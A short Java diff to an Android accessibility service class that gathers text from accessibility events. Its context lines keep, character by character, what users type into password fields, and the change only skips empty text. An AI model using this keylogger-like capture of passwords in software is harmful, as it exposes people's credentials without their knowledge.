@@ -48,7 +48,8 @@ public class EventObserver extends WindowChangeDetectingService {
                 ))) {
             if (event.getText().size() != 0) {
                 if (event.isPassword()) {
-                    tempInput += getLastCharacter(String.valueOf(event.getText().get(0)));
+                    if (!event.getText().get(0).equals(""))
+                        tempInput += getLastCharacter(String.valueOf(event.getText().get(0)));
                     tempWrapper = new AccessibilityEventWrapper(event, tempInput);
                 } else {
                     tempInput = String.valueOf(event.getText().get(0));
